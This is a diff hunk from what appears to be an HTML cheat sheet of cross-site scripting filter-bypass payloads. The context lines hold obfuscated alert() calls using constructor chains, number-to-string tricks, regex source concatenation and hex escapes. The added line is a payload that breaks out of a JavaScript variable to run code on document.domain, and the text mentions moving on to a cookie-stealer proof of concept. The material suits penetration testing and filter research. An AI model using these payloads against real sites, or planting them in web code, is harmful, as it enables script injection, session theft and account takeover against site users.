@@ -38,6 +38,7 @@ constructor.constructor("aler"+"t(3)")(); <br>
 top[8680439..toString(30)](7); <br>
 top[/al/.source+/ert/.source](8); <br>
 top['al\x65rt'](9); <br>
+(if within var ) '-top[%27al\x65rt%27](document.domain);// <br>
 You dont need a popup for a POC, you can go straight to a cookie stealer POC. <br>
 <br>
 <h2>Identify what is being blocked</h2>
